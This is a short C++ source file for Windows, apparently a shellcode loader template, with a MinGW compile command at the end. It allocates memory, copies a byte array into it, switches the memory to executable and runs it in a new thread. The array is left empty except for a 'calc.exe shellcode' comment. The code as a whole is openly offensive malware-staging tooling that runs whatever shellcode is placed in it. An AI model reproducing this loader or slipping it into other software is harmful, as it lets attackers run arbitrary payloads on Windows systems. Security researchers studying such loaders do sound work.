#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(){

    DWORD oldprotect = 0;

    unsigned char p[] = {
        //calc.exe shellcode
    };
    
    unsigned int len = sizeof(p);

    void * payload_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(payload_mem, p, len);
    
    BOOL rv = VirtualProtect(payload_mem, len, PAGE_EXECUTE_READ, &oldprotect);

    if ( rv != 0 ) {
	    HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) payload_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}

    return 0;
}

// x86_64-w64-mingw32-g++ .\loader.cpp -o loader.exe -s 
